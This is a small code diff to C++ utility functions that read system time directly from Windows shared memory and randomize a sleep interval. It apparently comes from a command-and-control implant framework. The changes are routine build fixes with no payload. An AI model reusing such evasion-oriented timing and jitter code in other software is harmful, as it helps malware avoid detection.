@@ -1,4 +1,4 @@
-#include <core/include/utils.hpp>
+#include <core/corelib/include/utils.hpp>
 namespace Utils {
 
     ULONG64 GetTimeNow() {
@@ -124,7 +124,7 @@ namespace Random {
         return Sleeptime;
     }
 
-    constexpr int RandomSeed() {
+    INT RandomSeed() {
 
         return 'A2' * -40271 +
                __TIME__[7] * 1 +
@@ -144,7 +144,7 @@ namespace Random {
         time.u.LowPart = *((ULONG*) (0x7FFE0000 + 0x14));
         time.u.HighPart = *((LONG*) (0x7FFE0000 + 0x1c));
 
-        return (UINT_PTR) ((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);
+        return (time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND;
     }
 
     ULONG RandomNumber32() {
@@ -178,7 +178,7 @@ namespace Random {
 
         HEXANE
 
-        constexpr int defaultseed = RandomSeed();
+        int defaultseed = RandomSeed();
         auto seed = Ctx->Nt.RtlRandomEx((ULONG*)&defaultseed);
 
         volatile size_t x = INTERVAL(seed);
